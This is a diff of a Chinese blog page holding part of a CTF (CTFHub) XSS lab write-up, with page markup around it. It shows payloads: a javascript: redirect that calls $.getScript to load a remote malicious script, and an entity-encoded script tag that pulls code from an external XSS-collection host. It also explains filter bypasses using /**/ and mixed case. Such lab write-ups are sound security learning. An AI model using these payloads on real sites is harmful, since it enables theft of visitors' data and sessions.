+<p>从网页代码可以看出来，这段脚本会把 GET 参数里的 jumpto 参数值提取出来，使用 location.href 跳转页面（重定向）。</p>
+<p><img src="https://s2.loli.net/2025/08/25/gpksGzIy5cNhaf7.png" alt="2.png"></p>
+<p>那这里可以使用 javascript: 协议配合 jQuery 的 $.getScript() 来动态加载、执行我的恶意脚本代码。</p>
+<blockquote>
+<p>在浏览器地址栏或者某些跳转逻辑中，如果 URL 以 javascript:代码开头，浏览器就会把后面的内容当作 JavaScript 来执行。</p>
+</blockquote>
+<blockquote>
+<p>$.getScript(url, callback) 是 jQuery 提供的 API，用于从指定 URL 动态加载并执行一段 JS 文件。</p>
+</blockquote>
+<p>直接构造链接输入到第二个框中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?jumpti=javascript:$.getScript(&quot;恶意脚本链接&quot;))</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2025/08/25/PDt5siSZjIf2xJu.png" alt="3.png"></p>
+<p>来到 XSS 平台后台，拿到 flag ！</p>
+<p><img src="https://s2.loli.net/2025/08/25/nMUk1JmTc64vrHR.png" alt="image.png"></p>
+<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>这道题会把空格过滤掉，我输入 &#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x20;&#x73;&#x52;&#x43;&#x3D;&#x2F;&#x2F;&#x75;&#x6A;&#x73;&#x2E;&#x63;&#x69;&#x2F;&#x32;&#x6C;&#x69;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E; 后变成了<br>&#x3C;&#x73;&#x43;&#x52;&#x69;&#x50;&#x74;&#x73;&#x52;&#x43;&#x3D;&#x2F;&#x2F;&#x75;&#x6A;&#x73;&#x2E;&#x63;&#x69;&#x2F;&#x32;&#x6C;&#x69;&#x3E;&#x3C;&#x2F;&#x73;&#x43;&#x72;&#x49;&#x70;&#x54;&#x3E; </p>
+<p><img src="https://s2.loli.net/2025/08/25/BGS3JUYQb16PHir.png" alt="2.png"></p>
+<p>可以用注释 /**/ 绕过。</p>
+<p><img src="https://s2.loli.net/2025/08/25/BGS3JUYQb16PHir.png" alt="2.png"></p>
+<h2 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h2><p>这道题更是把 script 直接过滤掉了</p>
+<p><img src="https://s2.loli.net/2025/08/25/KCUAboxYHRBtg63.png" alt="1.png"></p>
+<p>尝试用大小写混淆的方式绕过（其实我一开始就是用大小写混淆）</p>
+<p><img src="https://s2.loli.net/2025/08/25/KixAnIZ4N7GHBOL.png" alt="2.png"></p>
+<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>昨天我使用 <a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a> 简单练习了一下 XSS ，但是 XSS 最终目的是窃取用户数据，不是简单的 alert(‘xxx’) ，这次结合 XSS 平台了解了通过 XSS 窃取用户数据的完整流程，这不禁让我想起十几二十年前 QQ 空间、QQ 邮箱的 XSS 漏洞，原来是这么一回事啊！怪不得以前 QQ 空间老是中招呢！</p>
+<p><img src="https://s2.loli.net/2025/08/25/jMhbsr2uED7dZ1w.png" alt="image.png"></p>
 
-          
-        
       
     </div>
     
@@ -408,14 +499,44 @@
 
     <footer class="post-footer">
       
-
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          
+            <a href="/tags/ctfhub/" rel="tag"># ctfhub</a>
+          
+            <a href="/tags/xss/" rel="tag"># xss</a>
+          
+        </div>
       
 
       
+      
+      
 
       
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2025/08/24/XSS攻击练习/" rel="next" title="XSS攻击练习">
+                <i class="fa fa-chevron-left"></i> XSS攻击练习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
       
-        <div class="post-eof"></div>
+
+      
       
     </footer>
   </div>
@@ -425,14 +546,11 @@
   </article>
 
 
-    
-  </section>
 
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/29/">29</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -440,6 +558,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -460,8 +582,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -537,6 +668,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#准备"><span class="nav-number">2.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#做题"><span class="nav-number">3.</span> <span class="nav-text">做题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型-XSS"><span class="nav-number">3.1.</span> <span class="nav-text">反射型 XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#存储型-XSS"><span class="nav-number">3.2.</span> <span class="nav-text">存储型 XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-XSS"><span class="nav-number">3.3.</span> <span class="nav-text">DOM XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-跳转"><span class="nav-number">3.4.</span> <span class="nav-text">DOM 跳转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过滤空格"><span class="nav-number">3.5.</span> <span class="nav-text">过滤空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过滤关键词"><span class="nav-number">3.6.</span> <span class="nav-text">过滤关键词</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#感想"><span class="nav-number">4.</span> <span class="nav-text">感想</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -697,6 +844,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
